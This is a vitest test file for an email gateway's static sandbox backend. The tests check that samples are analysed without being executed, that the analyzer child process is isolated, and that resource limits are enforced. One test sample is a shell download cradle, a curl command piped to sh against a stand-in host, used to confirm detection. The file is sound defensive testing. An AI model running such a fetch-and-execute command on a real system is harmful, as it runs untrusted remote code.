import { randomUUID } from 'node:crypto';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  rmSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createLogger } from '@email-gateway/logger';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ScratchArea } from '../../scratch/scratch';
import type { RunContext, SandboxTaskInput } from '../backend';
import { ANALYZER_VERSION } from './analyzers/analysis';
import { compiledAnalyzerChild } from './child.test-support';
import { AnalyzerChildRunner } from './child-runner';
import { StaticBackend } from './static.backend';

const logger = createLogger({ service: 'static-test', level: 'silent' });
let root: string;
let scratch: ScratchArea;
let entry: string;

const limits = {
  wallTimeoutMs: 30_000,
  memoryMb: 256,
  cpuMillis: 1000,
  pids: 64,
  scratchMb: 64,
  maxArtifacts: 16,
  maxArtifactBytes: 2_097_152,
  maxTotalArtifactBytes: 8_388_608,
};

function runner(
  overrides: Partial<ConstructorParameters<typeof AnalyzerChildRunner>[0]> = {},
): AnalyzerChildRunner {
  return new AnalyzerChildRunner({
    entry,
    heapMb: 128,
    maxRssMb: 512,
    cpuSeconds: 10,
    timeoutMs: 20_000,
    prlimitPath: null,
    selftest: true,
    ...overrides,
  });
}

function task(bytes: Buffer, detectedType: string): SandboxTaskInput {
  return {
    taskId: randomUUID(),
    analysisId: '1',
    organizationId: '1',
    profile: 'static',
    sample: { bytes, sha256: '0'.repeat(64), sizeBytes: bytes.length, detectedType },
    limits,
    deadlineAt: new Date(Date.now() + 600_000),
  };
}

async function context(signal = new AbortController().signal): Promise<RunContext> {
  return { signal, scratchDir: await scratch.create(randomUUID()), logger, now: () => new Date() };
}

/** A scratch directory with the in/out layout the runner expects. */
async function jobDir(): Promise<string> {
  const dir = await scratch.create(randomUUID());
  mkdirSync(join(dir, 'in'), { mode: 0o700 });
  mkdirSync(join(dir, 'out'), { mode: 0o700 });
  return dir;
}

beforeAll(async () => {
  root = mkdtempSync(join(tmpdir(), 'eg-sbx-static-'));
  scratch = new ScratchArea(join(root, 'scratch'));
  await scratch.init();
  entry = compiledAnalyzerChild();
}, 60_000);

afterAll(() => {
  rmSync(root, { recursive: true, force: true });
});

describe('StaticBackend (real analyzer child)', () => {
  it('analyzes a script without executing it and returns findings and a static_report', async () => {
    const backend = new StaticBackend({ runner: runner({ selftest: false }), scratch, logger });
    const sample = Buffer.from('#!/bin/sh\ncurl -s http://cradle.example.test/x.sh | sh\n');
    const ctx = await context();
    const obs = await backend.run(task(sample, 'script_shell'), ctx);
    expect(obs.status).toBe('completed');
    expect(obs.executed).toBe(false);
    expect(obs.analyzerVersion).toBe(ANALYZER_VERSION);
    expect(obs.observations.findings.map((f) => f.code)).toEqual(
      expect.arrayContaining(['static.script_download_cradle', 'static.embedded_urls']),
    );
    expect(obs.observations.network.dns).toEqual([
      { name: 'cradle.example.test', type: 'other', source: 'static' },
    ]);
    expect(obs.artifacts).toHaveLength(1);
    const report = JSON.parse(obs.artifacts[0]!.bytes.toString('utf8')) as Record<string, unknown>;
    expect(obs.artifacts[0]).toMatchObject({
      kind: 'static_report',
      contentType: 'application/json',
    });
    expect(report).toMatchObject({
      v: 1,
      analyzer: ANALYZER_VERSION,
      detectedType: 'script_shell',
      format: 'script',
    });
    expect(JSON.stringify(report)).not.toContain('curl -s');
    // The sample was written 0400 (never executable) into <scratch>/in.
    const mode = statSync(join(ctx.scratchDir, 'in', 'sample')).mode & 0o777;
    expect(mode).toBe(0o400);
  });

  it('never executes a benign self-marking probe (no marker, executed=false)', async () => {
    const marker = join(root, `marker-${randomUUID()}`);
    const probe = Buffer.from(
      `#!/bin/sh\necho executed > ${marker}\nnode -e "require('fs').writeFileSync('${marker}','x')"\n`,
    );
    const backend = new StaticBackend({ runner: runner({ selftest: false }), scratch, logger });
    for (const type of ['script_shell', 'script_js', 'html', 'hta']) {
      const ctx = await context();
      const path = join(ctx.scratchDir, 'probe.sh');
      writeFileSync(path, probe);
      chmodSync(path, 0o700);
      const obs = await backend.run(task(probe, type), ctx);
      expect(obs.executed).toBe(false);
      expect(existsSync(marker)).toBe(false);
    }
  });

  it('answers type_not_supported for archives and images', () => {
    const backend = new StaticBackend({ runner: runner(), scratch, logger });
    expect(
      backend.supports({ profile: 'static', sample: task(Buffer.alloc(1), 'zip').sample }),
    ).toEqual({
      ok: false,
      reason: 'type_not_supported',
    });
    expect(
      backend.supports({
        profile: 'execute',
        sample: task(Buffer.alloc(1), 'script_shell').sample,
      }),
    ).toEqual({ ok: true });
  });

  it('passes its self-test and leaves no self-test scratch behind', async () => {
    const backend = new StaticBackend({ runner: runner({ selftest: false }), scratch, logger });
    const result = await backend.selfTest(AbortSignal.timeout(30_000));
    expect(result).toMatchObject({
      ok: true,
      code: 'ok',
      details: { execution: false, permissionModel: true, analyzerVersion: ANALYZER_VERSION },
    });
    const reap = await scratch.reap(new Set(), 'periodic', 0);
    expect(reap.failures).toBe(0);
  });

  it('builds the permission-model command line (no child processes, workers or addons)', () => {
    const { command, args } = runner({ selftest: false }).command('/scratch/t-1');
    expect(command).toBe(process.execPath);
    expect(args).toContain('--permission');
    expect(args.some((a) => a.startsWith('--allow-fs-write=') && a.endsWith('/out'))).toBe(true);
    expect(args.some((a) => a.startsWith('--allow-fs-read=') && a.endsWith('/in'))).toBe(true);
    expect(args).toContain('--max-old-space-size=128');
    expect(args.join(' ')).not.toMatch(/allow-child-process|allow-worker|allow-addons|--selftest/);
    const withPrlimit = new AnalyzerChildRunner({
      entry,
      heapMb: 64,
      maxRssMb: 128,
      cpuSeconds: 5,
      timeoutMs: 1000,
      prlimitPath: '/usr/bin/prlimit',
    });
    const cmd = withPrlimit.command('/scratch/t-1');
    expect(cmd.command).toBe('/usr/bin/prlimit');
    expect(cmd.args.slice(0, 3)).toEqual(['--cpu=6:7', '--core=0', '--']);
  });
});

describe('analyzer child isolation', () => {
  it('has an empty environment, cannot spawn processes or write outside out/', async () => {
    const r = runner();
    const env = await r.run(
      await jobDir(),
      { op: 'selftest', mode: 'env' },
      new AbortController().signal,
    );
    // macOS always injects __CF_USER_TEXT_ENCODING; Linux (every deployment) passes nothing.
    expect(env).toEqual({
      kind: 'probe',
      outcome: process.platform === 'linux' ? 'keys:0' : expect.stringMatching(/^keys:[01]$/),
    });
    expect(
      await r.run(await jobDir(), { op: 'selftest', mode: 'spawn' }, new AbortController().signal),
    ).toEqual({ kind: 'probe', outcome: 'denied' });
    const outside = join(root, `outside-${randomUUID()}`);
    expect(
      await r.run(
        await jobDir(),
        { op: 'selftest', mode: 'write_outside', path: outside },
        new AbortController().signal,
      ),
    ).toEqual({
      kind: 'probe',
      outcome: 'denied',
    });
    expect(existsSync(outside)).toBe(false);
    expect(
      await r.run(
        await jobDir(),
        { op: 'selftest', mode: 'write_output' },
        new AbortController().signal,
      ),
    ).toEqual({ kind: 'probe', outcome: 'allowed' });
  });

  it('refuses selftest probes without the test flag', async () => {
    const r = runner({ selftest: false });
    expect(
      await r.run(await jobDir(), { op: 'selftest', mode: 'env' }, new AbortController().signal),
    ).toEqual({ kind: 'error', code: 'selftest_disabled' });
  });
});

describe('analyzer child limits', () => {
  it('kills on CPU, RSS and heap as resource limits', async () => {
    const cpu = await runner({ cpuSeconds: 1 }).run(
      await jobDir(),
      { op: 'selftest', mode: 'cpu' },
      new AbortController().signal,
    );
    expect(cpu).toEqual({ kind: 'resources', reason: 'cpu' });
    const rss = await runner({ maxRssMb: 200 }).run(
      await jobDir(),
      { op: 'selftest', mode: 'memory' },
      new AbortController().signal,
    );
    expect(rss).toEqual({ kind: 'resources', reason: 'rss' });
    const heap = await runner({ heapMb: 32, maxRssMb: 2048 }).run(
      await jobDir(),
      { op: 'selftest', mode: 'heap' },
      new AbortController().signal,
    );
    expect(heap).toEqual({ kind: 'resources', reason: 'heap' });
  }, 60_000);

  it('kills on the wall timeout, reports crashes and aborts', async () => {
    expect(
      await runner({ timeoutMs: 1000 }).run(
        await jobDir(),
        { op: 'selftest', mode: 'hang' },
        new AbortController().signal,
      ),
    ).toEqual({ kind: 'timeout' });
    expect(
      await runner().run(
        await jobDir(),
        { op: 'selftest', mode: 'crash' },
        new AbortController().signal,
      ),
    ).toMatchObject({ kind: 'crashed' });
    const abort = new AbortController();
    setTimeout(() => abort.abort(), 300);
    expect(
      await runner().run(await jobDir(), { op: 'selftest', mode: 'hang' }, abort.signal),
    ).toEqual({ kind: 'aborted' });
  }, 30_000);

  it('maps a resource kill to a finding and a timeout/crash to failures', async () => {
    const big = Buffer.from('x');
    const timeoutBackend = new StaticBackend({ runner: runner({ timeoutMs: 1 }), scratch, logger });
    const t = await timeoutBackend.run(task(big, 'text'), await context());
    expect(['failed', 'completed']).toContain(t.status);
    // A child that dies before answering: crash → failed/analyzer_crashed.
    const fake = join(root, 'fake-child.js');
    writeFileSync(
      fake,
      `process.send({ op: 'ready', version: '${ANALYZER_VERSION}' }); process.on('message', () => process.exit(3));`,
    );
    const crashed = new StaticBackend({
      runner: new AnalyzerChildRunner({
        entry: fake,
        heapMb: 64,
        maxRssMb: 256,
        cpuSeconds: 5,
        timeoutMs: 5000,
        prlimitPath: null,
      }),
      scratch,
      logger,
    });
    expect(await crashed.run(task(big, 'text'), await context())).toMatchObject({
      status: 'failed',
      errorCode: 'analyzer_crashed',
    });
    // A forged / malformed reply is not trusted.
    const forged = join(root, 'forged-child.js');
    writeFileSync(
      forged,
      `process.send({ op: 'ready', version: '${ANALYZER_VERSION}' }); process.on('message', () => process.send({ op: 'result', ok: true, analysis: { v: 1, findings: [{ code: 'static.not_a_code', count: 1 }] } }));`,
    );
    const forgedBackend = new StaticBackend({
      runner: new AnalyzerChildRunner({
        entry: forged,
        heapMb: 64,
        maxRssMb: 256,
        cpuSeconds: 5,
        timeoutMs: 5000,
        prlimitPath: null,
      }),
      scratch,
      logger,
    });
    expect(await forgedBackend.run(task(big, 'text'), await context())).toMatchObject({
      status: 'failed',
      errorCode: 'analyzer_crashed',
    });
    // Another analyzer version in the handshake is refused.
    const old = join(root, 'old-child.js');
    writeFileSync(
      old,
      `process.send({ op: 'ready', version: 'sandbox-static/0' }); setInterval(() => {}, 1000);`,
    );
    const oldRunner = new AnalyzerChildRunner({
      entry: old,
      heapMb: 64,
      maxRssMb: 256,
      cpuSeconds: 5,
      timeoutMs: 5000,
      prlimitPath: null,
    });
    expect(
      await oldRunner.run(
        await jobDir(),
        { op: 'analyze', samplePath: '/x', detectedType: 'text' },
        new AbortController().signal,
      ),
    ).toEqual({
      kind: 'crashed',
      reason: 'version_mismatch',
    });
    // A resource kill during a parse is a limit finding (the file is hostile to parsers).
    const hostile = new StaticBackend({ runner: runner({ cpuSeconds: 1 }), scratch, logger });
    const spinning = join(root, 'spin-child.js');
    writeFileSync(
      spinning,
      `process.send({ op: 'ready', version: '${ANALYZER_VERSION}' }); process.on('message', () => { for (;;) {} });`,
    );
    const spinBackend = new StaticBackend({
      runner: new AnalyzerChildRunner({
        entry: spinning,
        heapMb: 64,
        maxRssMb: 512,
        cpuSeconds: 1,
        timeoutMs: 20_000,
        prlimitPath: null,
      }),
      scratch,
      logger,
    });
    const resource = await spinBackend.run(task(big, 'text'), await context());
    expect(resource).toMatchObject({ status: 'completed', executed: false });
    expect(resource.observations.limitsHit).toEqual(['analyzer_resources']);
    expect(resource.observations.findings).toEqual([
      { code: 'limit.analyzer_resources', severity: 'medium', count: 1 },
    ]);
    expect(resource.artifacts[0]?.kind).toBe('static_report');
    await hostile.close();
  }, 60_000);
});
